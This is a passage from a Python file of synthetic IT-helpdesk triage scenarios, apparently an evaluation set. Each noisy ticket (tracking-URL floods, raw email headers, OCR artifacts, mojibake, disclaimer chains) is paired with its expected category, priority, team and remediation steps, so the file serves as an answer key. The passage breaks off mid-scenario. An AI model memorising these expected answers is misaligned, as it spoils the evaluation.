                "- Wellness Week: https://contoso.com/events/wellness?id=WW2026&signup=true"
                "&utm_source=email&campaign=wellness&ref=newsletter&click_id=wellness_01\n"
                "- Hackathon: https://contoso.com/events/hackathon?id=HACK2026&register=true"
                "&utm_source=email&campaign=hackathon&mkt_tok=hack_token&trk=hhhh\n\n"
                "BENEFITS & HR:\n"
                "- Open Enrollment https://contoso.com/hr/benefits?period=2026&utm_source=email"
                "&utm_medium=newsletter&campaign=enrollment&click=benefits_link_01\n"
                "- 401k Update https://contoso.com/hr/401k?update=Q1_2026&utm_source=email"
                "&utm_medium=newsletter&campaign=retirement&trk=401k_link\n\n"
                "Manage preferences: https://contoso.com/preferences?user=hashed_email_id"
                "&utm_source=email&type=manage&mkt_tok=pref_token\n"
                "Unsubscribe: https://contoso.com/unsubscribe?id=unsub_12345&email=hashed"
                "&utm_source=email&type=unsubscribe&reason=all\n"
                "Privacy Policy: https://contoso.com/privacy?ref=email_footer&utm_source=email\n"
                "View in browser: https://contoso.com/newsletter/view?id=wk12_2026&format=html"
                "&utm_source=email&utm_medium=webview&mkt_tok=view_token\n\n"
                "--- End of Newsletter ---\n\n"
                "As I said, the SharePoint sync is broken. The library is "
                "https://contoso.sharepoint.com/sites/wealth-mgmt/Shared%20Documents/Reports "
                "and I'm on OneDrive version 24.030.0213.0002.\n\n"
                "Thanks,\nSophia Martinez\nClient Services"
            ),
            category=Category.DATA_STORAGE,
            priority=Priority.P3,
            team=Team.DATA_PLATFORM,
            needs_escalation=False,
            missing_info=[MissingInfo.ERROR_MESSAGE, MissingInfo.AFFECTED_SYSTEM],
            next_best_action=(
                "Investigate OneDrive for Business sync failure (red X, 'Sync pending') with "
                "~2 GB of pending uploads. The embedded newsletter with 15+ tracking URLs is noise. "
                "The actual issue is OneDrive client version 24.030.0213.0002 failing to sync "
                "with the wealth-mgmt SharePoint library."
            ),
            remediation_steps=[
                "Check OneDrive sync client logs (SyncDiagnostics.log) for specific error codes.",
                "Verify the user's OneDrive client is up to date and meets minimum version requirements.",
                "Check if the SharePoint library has any files exceeding size or path length limits.",
                "Reset the OneDrive sync client (onedrive.exe /reset) and re-establish the sync relationship.",
                "Check SharePoint Online storage quota and throttling limits for the site collection.",
            ],
            reporter_name="Sophia Martinez",
            reporter_email="sophia.martinez@contoso.com",
            reporter_department="Client Services",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "url-spam", "tracking-urls", "link-flood"],
            difficulty="medium",
        ),
        # ── DC-160  Email metadata noise (MIME headers, X-headers, DKIM) ──
        ScenarioDefinition(
            scenario_id="DC-160",
            subject="Teams call quality — choppy audio",
            description=(
                "MIME-Version: 1.0\n"
                'Content-Type: multipart/alternative; boundary="----=_Part_12345_67890.1710756000000"\n'
                "X-Mailer: Microsoft Outlook 16.0.18025.20160\n"
                "X-MS-Exchange-Organization-SCL: 0\n"
                "X-MS-Exchange-Organization-AuthSource: mail.contoso.com\n"
                "X-MS-Exchange-Organization-AuthAs: Internal\n"
                "X-MS-Exchange-MessageSentRepresentingType: 1\n"
                "X-MS-Has-Attach:\n"
                "X-MS-TNEF-Correlator:\n"
                "Authentication-Results: spf=pass (sender IP is 10.0.0.5) smtp.mailfrom=contoso.com;\n"
                " dkim=pass header.d=contoso.com;\n"
                " dmarc=pass action=none header.from=contoso.com;\n"
                "Received: from mail-east.contoso.com (10.0.0.5) by mail-hub.contoso.com (10.0.0.1)\n"
                " with Microsoft SMTP Server (TLS) id 15.2.1118.40; Mon, 18 Mar 2026 11:20:00 -0400\n"
                "Received: from laptop-AKM2910.contoso.com (172.16.50.42) by mail-east.contoso.com\n"
                " (10.0.0.5) with Microsoft SMTP Server id 15.2.1118.40 via Frontend Transport;\n"
                " Mon, 18 Mar 2026 11:19:58 -0400\n"
                "Return-Path: akira.morimoto@contoso.com\n"
                "Message-ID: <CAFp3Jz7kXmR+Qn8vL2wZ5gT@mail.contoso.com>\n"
                "X-Contoso-Spam-Score: 0.01\n"
                "X-Contoso-Antivirus: Clean\n"
                "X-Contoso-DLP-Policy: Finance-Confidential\n"
                "DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=contoso.com; s=selector1;\n"
                " h=From:Date:Subject:Message-ID:Content-Type:MIME-Version;\n"
                " bh=47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=;\n"
                " b=dGhpcyBpcyBub3QgYSByZWFsIERLSU0gc2lnbmF0dXJlIGJ1dCBpdCBsb29rcyByZWFsaXN0aWM=\n\n"
                "------=_Part_12345_67890.1710756000000\n"
                'Content-Type: text/plain; charset="UTF-8"\n\n'
                "Hi IT team,\n\n"
                "I'm experiencing really choppy audio on Microsoft Teams calls. Every call for the "
                "past two days, the audio cuts in and out every few seconds. Video is fine, "
                "screen sharing is fine, but voice is badly broken up. My colleagues say I "
                "sound robotic.\n\n"
                "I'm in the London office, Building 2, 8th floor. Using a Jabra Evolve2 75 "
                "headset connected via USB. Teams version 24053.811.3099.2529. Laptop is a "
                "Lenovo ThinkPad X1 Carbon Gen 11 on Wi-Fi.\n\n"
                "Thanks,\nAkira Morimoto\nQuantitative Analysis\n\n"
                "------=_Part_12345_67890.1710756000000--"
            ),
            category=Category.NETWORK,
            priority=Priority.P2,
            team=Team.NETWORK_OPS,
            needs_escalation=False,
            missing_info=[MissingInfo.NETWORK_LOCATION, MissingInfo.AFFECTED_USERS],
            next_best_action=(
                "Investigate choppy Microsoft Teams audio for user Akira Morimoto in the London "
                "office (Building 2, 8th floor, Wi-Fi). The raw email headers and MIME boundaries "
                "in the ticket are noise — the actual issue is degraded voice quality on Teams calls "
                "with a Jabra Evolve2 75 headset."
            ),
            remediation_steps=[
                "Check Wi-Fi signal quality and channel congestion on Building 2, 8th floor APs.",
                "Run a Teams network assessment tool to measure jitter, packet loss, and latency.",
                "Test with Ethernet instead of Wi-Fi to rule out wireless interference.",
                "Update Jabra Evolve2 75 firmware via Jabra Direct application.",
                "Check if QoS policies are properly tagging Teams audio traffic (DSCP EF/46).",
            ],
            reporter_name="Akira Morimoto",
            reporter_email="akira.morimoto@contoso.com",
            reporter_department="Quantitative Analysis",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "email-metadata", "mime-headers", "raw-headers"],
            difficulty="medium",
        ),
        # ── DC-161  Thread hijacking — topic switches mid-chain ──
        ScenarioDefinition(
            scenario_id="DC-161",
            subject="RE: RE: RE: Printer on 4th floor not working",
            description=(
                "From: Carlos Medina <carlos.medina@contoso.com>\n"
                "Sent: Wednesday, March 19, 2026 3:42 PM\n"
                "To: IT Support <itsupport@contoso.com>\n"
                "Subject: RE: RE: RE: Printer on 4th floor not working\n\n"
                "Actually, forget the printer — that got fixed yesterday when "
                "someone replaced the toner.\n\n"
                "I have a different problem now. I can't connect to the VPN from "
                "home. I'm using the Cisco AnyConnect client and when I enter my "
                "credentials and click Connect, it spins for about 30 seconds and "
                "then says 'Connection attempt has failed due to server being "
                "unreachable.' I've tried both vpn.contoso.com and "
                "vpn-backup.contoso.com. My home internet is working fine — I can "
                "browse the web and stream video without issues.\n\n"
                "I need VPN access urgently because I'm working from home tomorrow "
                "for the equity derivatives end-of-quarter reconciliation and I "
                "need to reach the Bloomberg terminal server and the internal "
                "pricing engine.\n\n"
                "Thanks,\nCarlos\n\n"
                "--- Original message ---\n"
                "From: IT Support <itsupport@contoso.com>\n"
                "Sent: Tuesday, March 18, 2026 10:15 AM\n\n"
                "Hi Carlos, we've dispatched a technician to check the 4th floor "
                "HP LaserJet Pro M404dn. Can you confirm the asset tag number?\n\n"
                "--- Original message ---\n"
                "From: Carlos Medina <carlos.medina@contoso.com>\n"
                "Sent: Monday, March 17, 2026 4:55 PM\n\n"
                "The printer next to the kitchen on the 4th floor is jammed again. "
                "Paper tray 2 won't feed. This is the third time this month."
            ),
            category=Category.NETWORK,
            priority=Priority.P3,
            team=Team.NETWORK_OPS,
            needs_escalation=False,
            missing_info=[MissingInfo.APPLICATION_VERSION],
            next_best_action=(
                "Investigate VPN connectivity failure for Carlos Medina using Cisco "
                "AnyConnect. The email thread started as a printer issue (now resolved) "
                "but the actual current problem is VPN unreachable errors when connecting "
                "to vpn.contoso.com and vpn-backup.contoso.com from a home network."
            ),
            remediation_steps=[
                "Verify Cisco AnyConnect client version and check for pending updates.",
                "Confirm VPN gateway health — check if vpn.contoso.com and vpn-backup.contoso.com "
                "are responding to connections from external networks.",
                "Ask the user to run a traceroute to vpn.contoso.com to identify where the "
                "connection is being dropped.",
                "Check if the user's home ISP is blocking UDP 443 or DTLS ports used by AnyConnect.",
                "Verify the user's VPN group policy and certificate have not expired.",
            ],
            reporter_name="Carlos Medina",
            reporter_email="carlos.medina@contoso.com",
            reporter_department="Equity Trading",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "thread-hijack"],
            difficulty="hard",
        ),
        # ── DC-162  Mixed RTL/LTR text with Hebrew and Arabic ──
        ScenarioDefinition(
            scenario_id="DC-162",
            subject="שגיאת הרשאות ב-SharePoint / SharePoint permissions error",
            description=(
                "שלום צוות IT,\n\n"
                "אני לא מצליחה לגשת לאתר SharePoint של מחלקת הציות. כשאני לוחצת "
                "על הקישור https://contoso.sharepoint.com/sites/compliance-docs "
                "אני מקבלת שגיאה.\n\n"
                "The error says 'Access Denied — You do not have permission to "
                "access this resource. Contact the site owner.' I was able to "
                "access this site last week without any issues.\n\n"
                "ملاحظة: زميلتي في فريق الامتثال في دبي أيضاً لا تستطيع الوصول "
                "إلى نفس الموقع منذ يوم الاثنين.\n\n"
                "Note from my Dubai colleague: she also gets the same Access Denied "
                "error since Monday. We both need this for the upcoming regulatory "
                "filing deadline on March 28.\n\n"
                "I'm using Microsoft Edge version 122.0 on Windows 11. My SharePoint "
                "account is yael.goldstein@contoso.com. I have not changed any of my "
                "credentials or group memberships recently.\n\n"
                "תודה רבה,\nיעל גולדשטיין\nCompliance Department"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P3,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[MissingInfo.ERROR_MESSAGE, MissingInfo.ENVIRONMENT_DETAILS],
            next_best_action=(
                "Investigate SharePoint Access Denied error on the compliance-docs site "
                "for Yael Goldstein and her Dubai colleague. The ticket contains mixed "
                "Hebrew, Arabic, and English text with bidirectional formatting — the "
                "core issue is a permissions regression on the Compliance SharePoint site "
                "since approximately Monday."
            ),
            remediation_steps=[
                "Check SharePoint site permissions for contoso.sharepoint.com/sites/"
                "compliance-docs — look for recent changes to site collection admins or "
                "member groups.",
                "Verify that the Compliance security group in Azure AD still includes "
                "yael.goldstein@contoso.com and the Dubai colleague's account.",
                "Check the SharePoint admin center audit logs for permission changes made around last Monday.",
                "Confirm the site has not been locked or placed in read-only mode by "
                "a retention policy or eDiscovery hold.",
                "Request the exact error message or correlation ID from the Access Denied "
                "page for deeper investigation.",
            ],
            reporter_name="Yael Goldstein",
            reporter_email="yael.goldstein@contoso.com",
            reporter_department="Compliance",
            channel=Channel.PORTAL,
            tags=["data-cleanup", "rtl-ltr-mixed"],
            difficulty="hard",
        ),
        # ── DC-163  HTML table paste — issue buried in spreadsheet data ──
        ScenarioDefinition(
            scenario_id="DC-163",
            subject="Data pipeline failure — see attached reconciliation table",
            description=(
                "<table border='1'><thead><tr><th>Row</th><th>Source</th>"
                "<th>Target</th><th>Status</th><th>Records</th><th>Notes</th>"
                "</tr></thead><tbody>\n"
                "<tr><td>1</td><td>Bloomberg Feed</td><td>pricing_db</td>"
                "<td>OK</td><td>14,302</td><td></td></tr>\n"
                "<tr><td>2</td><td>Reuters Feed</td><td>pricing_db</td>"
                "<td>OK</td><td>9,871</td><td></td></tr>\n"
                "<tr><td>3</td><td>Internal Trades</td><td>trade_ledger</td>"
                "<td>OK</td><td>3,455</td><td></td></tr>\n"
                "<tr><td>4</td><td>FX Rates</td><td>fx_rates_db</td>"
                "<td>OK</td><td>188</td><td></td></tr>\n"
                "<tr><td>5</td><td>Settlement Feed</td><td>settlements_db</td>"
                "<td>FAIL</td><td>0</td><td>ERROR: Connection to SQL Server "
                "instance SQLPROD-SETTLE-03 timed out after 30s. Last successful "
                "load was 2026-03-17 23:45:01 UTC. The nightly ETL job "
                "(job_id=ETL-SETTLE-DAILY-2026031800) has been failing since "
                "midnight. 12,847 settlement records are stuck in staging.</td></tr>\n"
                "<tr><td>6</td><td>Client Accounts</td><td>client_db</td>"
                "<td>OK</td><td>502</td><td></td></tr>\n"
                "<tr><td>7</td><td>Risk Metrics</td><td>risk_engine</td>"
                "<td>OK</td><td>22,190</td><td></td></tr>\n"
                "<tr><td>8</td><td>Margin Calls</td><td>margin_db</td>"
                "<td>OK</td><td>73</td><td></td></tr>\n"
                "</tbody></table>\n\n"
                "Hi IT — the above is this morning's reconciliation dashboard. "
                "Row 5 is the problem. The settlement ETL hasn't loaded since last "
                "night and we have nearly 13K records stuck. Can someone check "
                "SQLPROD-SETTLE-03? This is blocking the morning settlement report."
            ),
            category=Category.DATA_STORAGE,
            priority=Priority.P2,
            team=Team.DATA_PLATFORM,
            needs_escalation=False,
            missing_info=[MissingInfo.AFFECTED_SYSTEM, MissingInfo.ERROR_MESSAGE],
            next_best_action=(
                "Investigate connection timeout to SQL Server instance "
                "SQLPROD-SETTLE-03 that is blocking the nightly settlement ETL "
                "pipeline. The ticket contains a pasted HTML table with reconciliation "
                "data — the actual issue is in row 5: 12,847 settlement records stuck "
                "in staging since the job ETL-SETTLE-DAILY-2026031800 started failing."
            ),
            remediation_steps=[
                "Check the health and availability of SQL Server instance "
                "SQLPROD-SETTLE-03 — verify it is online and accepting connections.",
                "Review SQL Server error logs for disk space, memory pressure, or "
                "blocking lock issues around midnight UTC on March 18.",
                "Verify network connectivity between the ETL server and "
                "SQLPROD-SETTLE-03 — check for firewall rule changes or DNS issues.",
                "Once the server is restored, re-run ETL job "
                "ETL-SETTLE-DAILY-2026031800 to flush the 12,847 staged records.",
                "Confirm the morning settlement report generates correctly after the data load completes.",
            ],
            reporter_name="James O'Brien",
            reporter_email="james.obrien@contoso.com",
            reporter_department="Data Engineering",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "html-table-paste"],
            difficulty="medium",
        ),
        # ── DC-164  Extreme OCR artifacts from scanned fax ──
        ScenarioDefinition(
            scenario_id="DC-164",
            subject="Sc4nner / pr1nter 1ssue on 2nd f1oor",
            description=(
                "D3ar IT H3lp D3sk,\n\n"
                "Th3 mult1funct1on pr1nter/sc4nner 0n the 2nd fl00r (n3ar the "
                "c0nference r00m) 1s n0t w0rk1ng pr0perly. Wh3n I try t0 sc4n "
                "d0cum3nts t0 3ma1l, th3 mach1ne g1ves an 3rr0r c0de E-742 4nd "
                "th3 sc4n n3ver c0mpl3tes.\n\n"
                "Th1s start3d y3sterday aft3rn00n. I'v3 tr1ed r3b00t1ng th3 "
                "d3v1ce tw1ce but th3 pr0bl3m p3rs1sts. 0ther p30pl3 0n my "
                "fl00r ar3 als0 aff3cted — n0b0dy c4n sc4n t0 ema1l.\n\n"
                "The pr1nt1ng funct10n st1ll w0rks f1ne, 1t's 0nly the sc4n-"
                "t0-3ma1l f3ature that 1s br0ken. C0py1ng als0 w0rks.\n\n"
                "I n33d th1s f1xed urg3ntly b3caus3 w3 hav3 a batch 0f "
                "fac1l1ty ma1nt3nance f0rms that n33d t0 b3 d1g1t1z3d by "
                "Fr1day.\n\n"
                "Thank y0u,\nD0r0thy Wang\nFac1l1t1es D3partm3nt\n"
                "Ext. 4 -1 0 2"
            ),
            category=Category.HARDWARE,
            priority=Priority.P3,
            team=Team.ENDPOINT,
            needs_escalation=False,
            missing_info=[MissingInfo.DEVICE_INFO, MissingInfo.ERROR_MESSAGE],
            next_best_action=(
                "Investigate scan-to-email failure (error code E-742) on the 2nd floor "
                "multifunction printer/scanner near the conference room. The ticket text "
                "has severe OCR artifacts from a scanned fax — letters are systematically "
                "replaced (e→3, o→0, i→1, a→4). The actual issue is that scanning to "
                "email fails while printing and copying still work."
            ),
            remediation_steps=[
                "Identify the exact make and model of the 2nd floor multifunction "
                "device — check the asset management database for devices near the "
                "conference room.",
                "Look up error code E-742 in the manufacturer's documentation to "
                "determine the root cause (likely SMTP relay or network config).",
                "Check the device's scan-to-email SMTP settings — verify the relay "
                "server, port, and authentication credentials are still valid.",
                "Test the device's network connectivity to the mail relay server.",
                "If the SMTP relay configuration is correct, check whether the device's email certificate has expired.",
            ],
            reporter_name="Dorothy Wang",
            reporter_email="dorothy.wang@contoso.com",
            reporter_department="Facilities",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "ocr-artifacts"],
            difficulty="hard",
        ),
        # ── DC-165  Terse one-word ticket with no usable information ──
        ScenarioDefinition(
            scenario_id="DC-165",
            subject="help",
            description=("broken"),
            category=Category.GENERAL_INQUIRY,
            priority=Priority.P4,
            team=Team.NONE,
            needs_escalation=False,
            missing_info=[
                MissingInfo.AFFECTED_SYSTEM,
                MissingInfo.ERROR_MESSAGE,
                MissingInfo.STEPS_TO_REPRODUCE,
                MissingInfo.DEVICE_INFO,
                MissingInfo.CONTACT_INFO,
                MissingInfo.ENVIRONMENT_DETAILS,
            ],
            next_best_action=(
                "Request basic information from the reporter. The ticket contains "
                "only 'help' as the subject and 'broken' as the description with no "
                "identifying information, no system details, and no way to contact "
                "the reporter. Cannot triage without knowing what is broken."
            ),
            remediation_steps=[
                "Attempt to identify the reporter from the submission metadata "
                "(IP address, authenticated session, or chat handle).",
                "Reply requesting: what system or application is broken, what error "
                "they see, when the issue started, and their contact information.",
                "If no response is received within 24 hours, close the ticket as "
                "insufficient information with a note inviting resubmission.",
            ],
            reporter_name="anonymous reporter",
            reporter_email="unknown@contoso.com",
            reporter_department="Unknown",
            channel=Channel.CHAT,
            tags=["data-cleanup", "terse-ticket"],
            difficulty="hard",
        ),
        # ── DC-166  Terminal output dump with issue buried in noise ──
        ScenarioDefinition(
            scenario_id="DC-166",
            subject="Network issue — see diagnostic output below",
            description=(
                "PS C:\\Users\\arashid> ipconfig /all\n\n"
                "Windows IP Configuration\n\n"
                "   Host Name . . . . . . . . . . . . : WS-ARASHID-01\n"
                "   Primary Dns Suffix  . . . . . . . : contoso.com\n"
                "   Node Type . . . . . . . . . . . . : Hybrid\n"
                "   IP Routing Enabled. . . . . . . . : No\n"
                "   WINS Proxy Enabled. . . . . . . . : No\n"
                "   DNS Suffix Search List. . . . . . : contoso.com\n\n"
                "Ethernet adapter Ethernet0:\n\n"
                "   Connection-specific DNS Suffix  . : contoso.com\n"
                "   Description . . . . . . . . . . . : Intel(R) Ethernet Connection I219-LM\n"
                "   DHCP Enabled. . . . . . . . . . . : Yes\n"
                "   IPv4 Address. . . . . . . . . . . : 10.50.22.187\n"
                "   Subnet Mask . . . . . . . . . . . : 255.255.254.0\n"
                "   Default Gateway . . . . . . . . . : 10.50.22.1\n"
                "   DNS Servers . . . . . . . . . . . : 10.0.1.53\n"
                "                                       10.0.2.53\n\n"
                "PS C:\\Users\\arashid> tracert 10.0.5.40\n\n"
                "Tracing route to sqlprod-report-01.contoso.com [10.0.5.40]\n"
                "over a maximum of 30 hops:\n\n"
                "  1    <1 ms    <1 ms    <1 ms  10.50.22.1\n"
                "  2     1 ms     1 ms     1 ms  core-sw-bldg3.contoso.com [10.0.0.1]\n"
                "  3     *        *        *     Request timed out.\n"
                "  4     *        *        *     Request timed out.\n"
                "  5     *        *        *     Request timed out.\n\n"
                "Trace complete.\n\n"
                "PS C:\\Users\\arashid> Test-NetConnection 10.0.5.40 -Port 1433\n\n"
                "ComputerName     : 10.0.5.40\n"
                "RemoteAddress    : 10.0.5.40\n"
                "RemotePort       : 1433\n"
                "TcpTestSucceeded : False\n\n"
                "I can't reach the reporting database server (sqlprod-report-01, "
                "10.0.5.40) from my workstation. Traceroute dies at hop 3 and "
                "TCP port 1433 is unreachable. This started after the network "
                "maintenance window last night. I need this for the CI/CD pipeline "
                "that deploys reporting dashboard updates."
            ),
            category=Category.NETWORK,
            priority=Priority.P2,
            team=Team.NETWORK_OPS,
            needs_escalation=False,
            missing_info=[MissingInfo.NETWORK_LOCATION],
            next_best_action=(
                "Investigate network connectivity failure between workstation "
                "WS-ARASHID-01 (10.50.22.187) and reporting database server "
                "sqlprod-report-01 (10.0.5.40) on port 1433. The ticket is mostly "
                "terminal output from ipconfig/tracert/Test-NetConnection — the key "
                "finding is that traceroute fails at hop 3 after last night's "
                "maintenance window."
            ),
            remediation_steps=[
                "Check the network change log from last night's maintenance window "
                "for ACL or firewall rule changes affecting the 10.50.22.0/23 to "
                "10.0.5.0/24 route.",
                "Verify the core switch (core-sw-bldg3, 10.0.0.1) routing table "
                "includes the correct next-hop for the 10.0.5.0/24 subnet.",
                "Check if the firewall between Building 3 and the data center "
                "VLAN has a rule permitting TCP 1433 from the DevOps subnet.",
                "Confirm sqlprod-report-01 (10.0.5.40) is online and the SQL Server service is listening on port 1433.",
                "Request the user's physical office location to confirm which network segment they are on.",
            ],
            reporter_name="Ahmed Rashid",
            reporter_email="ahmed.rashid@contoso.com",
            reporter_department="DevOps",
            channel=Channel.PORTAL,
            tags=["data-cleanup", "terminal-dump"],
            difficulty="medium",
        ),
        # ── DC-167  Auto-generated monitoring alert with JSON payloads ──
        ScenarioDefinition(
            scenario_id="DC-167",
            subject="[ALERT][CRITICAL] Service degradation detected — AppPool recycle threshold exceeded",
            description=(
                "--- Automated Alert from Contoso Monitoring Platform ---\n"
                "Alert ID: MON-2026031800247\n"
                "Severity: CRITICAL\n"
                "Source: Datadog Agent v7.52.1\n"
                "Timestamp: 2026-03-18T06:15:33.441Z\n"
                "Host: webprod-app-07.contoso.com\n"
                "Service: contoso-trading-portal\n\n"
                "Payload:\n"
                '{"monitor_id":88421,"monitor_name":"IIS AppPool Recycle Rate",'
                '"status":"Alert","threshold":5,"current_value":23,'
                '"tags":["env:production","service:trading-portal",'
                '"team:enterprise-apps","region:us-east"],'
                '"message":"AppPool \'ContosoTradingPortal\' has recycled 23 '
                "times in the last hour (threshold: 5). Likely memory leak or "
                'unhandled exception causing repeated crashes.",'
                '"host":"webprod-app-07.contoso.com",'
                '"ip":"10.0.12.107","last_recycle":"2026-03-18T06:14:58Z",'
                '"w3wp_pid":18204,"private_bytes_mb":3841,'
                '"gen2_gc_count":1247}\n\n'
                "PagerDuty Incident: PD-INC-20260318-0091\n"
                "Escalation Policy: Enterprise Apps On-Call\n"
                "Acknowledged by: (none)\n\n"
                "--- End Alert ---"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P2,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[MissingInfo.AFFECTED_USERS, MissingInfo.BUSINESS_IMPACT],
            next_best_action=(
                "Investigate excessive IIS AppPool recycling on webprod-app-07 for "
                "the Contoso Trading Portal. The automated monitoring alert indicates "
                "23 recycles in the last hour (threshold: 5), with the w3wp process "
                "consuming 3.8 GB of private bytes — likely a memory leak causing "
                "repeated crashes."
            ),
            remediation_steps=[
                "Connect to webprod-app-07.contoso.com and check IIS Manager for "
                "the ContosoTradingPortal AppPool status and recent recycle events.",
                "Collect a memory dump of the w3wp.exe process (PID 18204) before "
                "the next recycle to analyze for memory leaks.",
                "Check the Windows Event Log (Application and System) for crash "
                "details, unhandled exceptions, or out-of-memory events.",
                "As an immediate mitigation, increase the AppPool private memory "
                "limit and recycle interval to reduce user-facing impact.",
                "Determine the number of affected users and business impact — the "
                "trading portal may be intermittently unavailable during recycles.",
            ],
            reporter_name="monitoring-bot",
            reporter_email="monitoring-bot@contoso.com",
            reporter_department="Engineering",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "monitoring-alert"],
            difficulty="medium",
        ),
        # ── DC-168  Double-encoded UTF-8 (mojibake) ──
        ScenarioDefinition(
            scenario_id="DC-168",
            subject="ProblÃ¨me avec l'application de rapports financiers",
            description=(
                "Bonjour Ã©quipe IT,\n\n"
                "Je suis FranÃ§ois Leblanc du dÃ©partement Finance. J'ai un "
                "problÃ¨me avec l'application de rapports financiers "
                "(Contoso Financial Reporter v4.2).\n\n"
                "Quand j'essaie de gÃ©nÃ©rer le rapport trimestriel Q1 2026, "
                "l'application affiche une erreur: Â«Ã‰chec de la gÃ©nÃ©ration "
                "du rapport \u2014 connexion Ã\u00a0 la base de donnÃ©es interrompueÂ».\n\n"
                "The error started this morning. I can log into the application "
                "fine but any report that queries the financial data warehouse "
                "fails with what appears to be a database connection timeout. "
                "Other colleagues in Finance — RenÃ©e Dufresne and StÃ©phane "
                "MorÃ©au — are experiencing the same issue.\n\n"
                "J'utilise Windows 11 avec Chrome version 123.0.6312.58. "
                "L'application fonctionne normalement pour les rapports en "
                "cache mais pas pour les nouvelles requÃªtes.\n\n"
                "Merci,\nFranÃ§ois Leblanc\nFinance"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P3,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[MissingInfo.APPLICATION_VERSION, MissingInfo.STEPS_TO_REPRODUCE],
            next_best_action=(
                "Investigate database connection timeout in Contoso Financial "
                "Reporter v4.2 when generating the Q1 2026 quarterly report. "
                "The ticket has double-encoded UTF-8 (mojibake) throughout — "
                "the reporter is François Leblanc from Finance. Multiple users "
                "are affected. Cached reports work but live queries to the "
                "financial data warehouse fail."
            ),
            remediation_steps=[
                "Check the financial data warehouse connectivity — verify the "
                "database server is online and accepting connections from the "
                "Financial Reporter application server.",
                "Review the Financial Reporter application logs for the exact "
                "database connection error and timeout details.",
                "Confirm whether the issue affects all report types or only "
                "those querying specific data warehouse tables.",
                "Check if any database maintenance, patching, or schema changes "
                "were performed overnight that could affect connectivity.",
                "Verify the application's database connection string and credentials have not expired or been rotated.",
            ],
            reporter_name="François Leblanc",
            reporter_email="francois.leblanc@contoso.com",
            reporter_department="Finance",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "mojibake", "encoding"],
            difficulty="hard",
        ),
        # ── DC-169  Massive disclaimer chain burying actual MFA issue ──
        ScenarioDefinition(
            scenario_id="DC-169",
            subject="Can't log in — MFA not working",
            description=(
                "Hi, I can't complete MFA on my phone. The Microsoft Authenticator "
                "app shows a number-matching prompt but when I tap the correct number, "
                "it says 'Approval failed — please try again' and I'm locked out of "
                "everything. I've tried 6 times this morning. My phone is an iPhone 14 "
                "Pro on iOS 17.4. I need access urgently for a court filing deadline "
                "at 2 PM today.\n\n"
                "— Sophia Papadopoulos, Legal Department, Ext. 5501\n\n"
                "═══════════════════════════════════════════════════\n"
                "CONFIDENTIALITY NOTICE: This email and any attachments are for the "
                "exclusive and confidential use of the intended recipient. If you are "
                "not the intended recipient, please do not read, distribute, or take "
                "action based on this message. If you have received this email in "
                "error, please notify the sender immediately by return email and "
                "permanently delete this message and any attachments.\n\n"
                "AVIS DE CONFIDENTIALITÉ: Ce courriel et ses pièces jointes sont "
                "destinés exclusivement au destinataire prévu et sont confidentiels. "
                "Si vous n'êtes pas le destinataire prévu, veuillez ne pas lire, "
                "distribuer ou prendre des mesures fondées sur ce message.\n\n"
                "VERTRAULICHKEITSHINWEIS: Diese E-Mail und alle Anhänge sind "
                "ausschließlich für den vorgesehenen Empfänger bestimmt und "
                "vertraulich. Wenn Sie nicht der vorgesehene Empfänger sind, lesen, "
                "verteilen oder handeln Sie bitte nicht auf Grundlage dieser "
                "Nachricht.\n\n"
                "機密通知：本電子郵件及其附件僅供預定收件人專用及機密使用。如果您不是預定"
                "收件人，請勿閱讀、分發或根據本郵件採取行動。\n\n"
                "إشعار السرية: هذا البريد الإلكتروني وأي مرفقات مخصصة حصرياً "
                "للمستلم المقصود وهي سرية. إذا لم تكن المستلم المقصود، يرجى عدم "
                "القراءة أو التوزيع أو اتخاذ أي إجراء بناءً على هذه الرسالة.\n\n"
                "This email has been scanned by the Contoso Email Security Gateway. "
                "No threats detected. Message ID: MSG-20260319-LGL-00847. "
                "Classification: Contoso-Internal. Retention: 7 years (Legal Hold). "
                "DLP Policy: Legal-Privileged-Communications.\n"
                "═══════════════════════════════════════════════════"
            ),
            category=Category.ACCESS_AUTH,
            priority=Priority.P2,
            team=Team.IAM,
            needs_escalation=False,
            missing_info=[MissingInfo.DEVICE_INFO, MissingInfo.AUTHENTICATION_METHOD],
            next_best_action=(
                "Investigate MFA approval failure for Sophia Papadopoulos in the "
                "Legal Department. The email is 90% legal disclaimers in 5 languages "
                "— the actual issue is that Microsoft Authenticator number-matching "
                "shows 'Approval failed — please try again' after tapping the correct "
                "number. User has a court filing deadline at 2 PM and is locked out."
            ),
            remediation_steps=[
                "Check Azure AD sign-in logs for sophia.papadopoulos@contoso.com "
                "to see the MFA failure reason codes (e.g., token expired, device "
                "not registered, time sync issue).",
                "Verify the user's Authenticator app registration in the Azure AD "
                "MFA portal — re-register the device if the enrollment is corrupted.",
                "Check if the iPhone's date/time is set to automatic — TOTP-based "
                "approvals fail if the device clock is skewed.",
                "As an urgent workaround, issue a temporary access pass so the user "
                "can meet the 2 PM court filing deadline.",
                "After access is restored, have the user remove and re-add their "
                "account in the Microsoft Authenticator app.",
            ],
            reporter_name="Sophia Papadopoulos",
            reporter_email="sophia.papadopoulos@contoso.com",
            reporter_department="Legal",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "disclaimer-chain"],
            difficulty="hard",
        ),
        # ── DC-170  Interleaved conversations — two merged threads ──
        ScenarioDefinition(
            scenario_id="DC-170",
            subject="RE: Monitor flickering / Also: Adobe Creative Cloud license",
            description=(
                "From: Nina Johansson <nina.johansson@contoso.com>\n"
                "Sent: Thursday, March 20, 2026 9:17 AM\n"
                "To: IT Support <itsupport@contoso.com>\n\n"
                "Hi IT team, I have two separate issues that somehow ended up "
                "in the same email thread (sorry, my Outlook merged them).\n\n"
